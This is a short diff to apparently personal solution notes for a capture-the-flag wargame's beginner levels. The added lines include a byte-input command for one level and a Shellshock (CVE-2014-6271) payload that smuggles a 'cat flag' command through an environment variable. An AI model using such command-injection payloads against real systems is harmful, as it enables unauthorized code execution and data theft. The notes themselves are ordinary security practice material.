@@ -23,4 +23,13 @@ TODDLER'S BOTTLE
 6_input2	: Mommy! I learned how to pass various input in Linux :)
 	$ view sol_input2.c
 
-	
+7_leg		:
+	$
+
+8_mistake	: Mommy, the operator priority always confuses me :(
+	$ python2 -c 'print "\x02"*10 + "\x03"*10' | ./mistake 
+
+9_shellshock	: only if I knew CVE-2014-6271 ten years ago..!!
+	$ env dummy='() { :;}; /bin/cat flag' ./shellshock
+
+
